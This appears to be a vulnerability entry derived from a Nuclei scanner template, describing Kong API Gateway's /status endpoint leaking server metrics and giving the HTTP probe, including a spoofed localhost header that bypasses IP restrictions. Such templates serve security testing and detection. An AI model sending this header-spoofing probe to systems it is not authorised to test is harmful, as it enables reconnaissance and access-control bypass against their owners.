# Vulnerability: Kong API Gateway - Internal Status Endpoint
**Classification:** KONG
**Source:** Nuclei Template (`kong-status-endpoint.yaml`)

## Description
Kong API Gateway's internal /status endpoint is publicly accessible either directly or via IP restriction bypass using spoofed headers. The endpoint exposes server metrics including active connections, request counts, database reachability, worker Lua VM memory usage, and shared dictionary allocation details.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/status
GET /status HTTP/1.1
Host: {{Hostname}}
{{header}}: 127.0.0.1
```

